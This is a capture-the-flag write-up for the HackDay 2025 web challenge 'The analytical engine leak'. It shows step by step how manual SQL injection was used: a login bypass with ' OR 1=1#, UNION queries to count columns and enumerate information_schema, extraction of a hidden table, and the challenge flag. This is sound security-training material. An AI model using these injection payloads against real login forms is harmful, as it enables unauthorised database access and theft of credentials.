---
title: HackDay 2025 - The analytical engine leak
date: 2025-01-26
categories:
  - CTFs
  - HackDay 2025
  - Web
tags:
  - web
  - sqli
description: Web challenge exploiting a SQL Injection enabled extracting an encryption key hidden in a database using a UNION SQLi attack, thus revealing the flag. 🔍
---

## Description 

* Category: Web 
* Vulnerability: SQLi

>In the shadow of the huge copper chimneys, a dark plot is brewing. The engineers of the Inventors' Guild have developed a revolutionary device: a steam-powered analytical machine capable of deciphering all secret codes. But before it could be activated, a group of cyber-saboteurs, the Black Mist, infiltrated its network to steal the plans. Fortunately, the plans were encrypted.
>
>An allied spy intercepted a trail leading to the Steam Station's digital archives, where a secret database stores crucial information for deciphering the device's plans. However, access is restricted, and only a few people can extract the contents.
>
>Your mission: exploit a flaw in the system to recover the encryption key before it falls into the wrong hands. To avoid alerting an archivist, the use of automatic tools is prohibited. Manual exploitation only.
>
>no sqlmap or things like that allowed

[Link of the event](https://ctftime.org/event/2615)
## Enumeration 

![](assets/img_0128_0522_oxfng.png)

### Identify the vulnerability

Upon encountering a login field, a common first step is to test for **SQL Injection (SQLi)** vulnerabilities. This can be done by injecting characters commonly used in SQL queries, such as `'` or `"`. In this case, injecting these characters resulted in an error message, confirming the presence of an SQLi vulnerability:

![](assets/img_0128_0523_rpuqs.png)

This error indicates that the application integrates user input directly into SQL queries without proper sanitization, leaving it vulnerable to injection attacks. The clear error messages provide useful feedback, making it easier to exploit the vulnerability.

By injecting a basic SQL payload, such as `' OR 1=1#`, we were able to retrieve a response that included all user accounts :

![](assets/Pasted%20image%2020250128130428.png)

The task description mentions that there could be a hidden secret, and our goal is to recover the encryption key. To achieve this, we can attempt to use **UNION SQL Injection** to enumerate all existing tables and extract data from the database.

We can infer the backend query structure as follows:

```sql
SELECT username,password FROM users
```

Our goal is to manipulate this query to extract additional information from the database.
## Exploitation

To successfully exploit UNION SQLi, we need to satisfy two conditions:
1. The **number of columns** and their **order** must match between the original query and the injected query.
2. The **data types** of the columns in both queries must be compatible.


### 1. Determining the Number of Columns
```
whatever' UNION SELECT NULL#           (<= ERREUR)
whatever' UNION SELECT NULL,NULL#      (<= ERREUR)
whatever' UNION SELECT NULL,NULL,NULL# (<= OK !)
```
* Result: **3 columns** 

### 2. Determining Column Data Types

```
whatever' UNION SELECT 'a',NULL,NULL#
whatever' UNION SELECT NULL,'a',NULL#
whatever' UNION SELECT NULL,NULL,'a'#
```
* Result : 
	* All 3 columns accept strings.
	- The third column does not return data to the user, likely being used internally (e.g., for an ID).

### 3. Enumerating the Database

1. Listing Tables
```
whatever' UNION SELECT table_name,NULL,NULL FROM information_schema.tables#
```

Result: We discover a table named **`blueprints`**:

![](assets/img_0128_0524_wcghn.png)

2. Listing Columns of the `blueprints` Table
```
whatever' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='blueprints'#
```

![](assets/img_0128_0525_bpoul.png)

Result: The table contains 5 columns: `id`, `username`, `password` `description` and `file_name`.

3. Extracting Data from the `blueprints` Table
```
whatever' UNION SELECT description,file_name,NULL FROM blueprints#
```

![](assets/img_0128_0526_jfkvh.png)

Result: We find an interesting file name, **`secret_key.txt`**, which appears to be encoded in Base58. Decoding it reveals the final flag:

`HACKDAY{$ea5y_INjeCTion$}`